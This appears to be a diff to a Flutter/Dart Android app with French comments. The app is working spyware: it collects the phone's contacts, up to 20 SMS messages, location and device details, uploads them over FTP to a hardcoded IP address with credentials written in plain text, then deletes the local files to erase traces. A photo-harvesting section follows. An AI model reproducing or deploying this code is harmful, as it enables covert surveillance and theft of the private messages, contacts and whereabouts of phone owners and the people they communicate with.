@@ -56,7 +56,7 @@ class _MyHomePageState extends State<MyHomePage> {
     FTPConnect ftpConnect = FTPConnect('141.94.77.172',
     user: 'utilisateursftp', pass: 'Sftp59?Spyware!');
 
-    // ***** PARTIE CREATION DES FICHIERS *****
+    // ********** PARTIE CREATION DES FICHIERS ***********
     Directory tempDir = await getTemporaryDirectory();
     // Creation de la liste de fichiers finals
     var list_files = ["${tempDir.path}/contact.txt","${tempDir.path}/sms.txt","${tempDir.path}/phone_information.txt","${tempDir.path}/localisation.txt"];
@@ -73,7 +73,7 @@ class _MyHomePageState extends State<MyHomePage> {
     final File file_geo = File("${tempDir.path}/localisation.txt");
     final filename_geo = "${tempDir.path}/localisation.txt";
 
-    // ***** PARTIE INFORMATIONS TELEPHONE *****
+    // ********** PARTIE INFORMATIONS TELEPHONE **********
 
     if (Platform.isAndroid) {
       var androidInfo = await DeviceInfoPlugin().androidInfo;
@@ -84,7 +84,7 @@ class _MyHomePageState extends State<MyHomePage> {
       File(filename_phone).writeAsString("Informations sur le telephone : \nAndroid $release, $manufacturer, $host").then((File file_phone) {});
     }
 
-    // ***** PARTIE CONTACTS *****
+    // *********** PARTIE CONTACTS ***********
 
     // Récupérer l'ensemble des contacts dans une liste
     List<Contact> contacts = await ContactsService.getContacts();
@@ -96,13 +96,13 @@ class _MyHomePageState extends State<MyHomePage> {
     }
     File(filename_contact).writeAsString(info_contact).then((File file_contact) {});
 
-    // ***** PARTIE LOCALISATION *****
+    // ********** PARTIE LOCALISATION **********
 
     var location = await Geolocator.getCurrentPosition();
     var position = "${location}";
     File(filename_geo).writeAsString("Informations sur la position du telephone : "+position).then((File file_geo) {});
 
-    // ***** PARTIE SMS *****
+    // ********** PARTIE SMS **********
     File(filename_sms).writeAsString("Recuperation des SMS : ").then((File file_sms) {});
 
     // Création de l'instance de la classe SmsQuery
@@ -110,14 +110,18 @@ class _MyHomePageState extends State<MyHomePage> {
     // Récupération de la liste des instances SMS (reçus et envoyés)
     List<SmsMessage> messages = await query.querySms(kinds: [SmsQueryKind.Inbox, SmsQueryKind.Sent]);
 
+    int compteur = 0;
     var sms = "";
     // Parcourir les messages
     for (var message in messages) {
-      sms = sms+"Numero Expediteur : "+message.sender+" Corps du message : "+message.body+"\n";
+      if (compteur < 20) {
+        sms = sms+"Numero Expediteur : "+message.sender+" Corps du message : "+message.body+"\n";
+        compteur++;
+      }
     }
     File(filename_sms).writeAsString(sms).then((File file_sms) {});
 
-    // ***** Partie Envoie des fichiers *****
+    // ********** Partie Envoie des fichiers **********
 
     // Faire une liste des fichiers à envoyer
     for (var fichier in list_files) {
@@ -130,7 +134,12 @@ class _MyHomePageState extends State<MyHomePage> {
       await ftpConnect.disconnect();
     } 
 
-    // ***** PARTIE PHOTOS *****
+    // ***** Effacement des traces *****
+    for (var fichier in list_files) {
+      File(fichier).deleteSync(); 
+    }
+
+    // ********** PARTIE PHOTOS **********
 
     // Récupération de la liste de fichier
     Directory dir = Directory('/storage/1CEC-2F09/images');
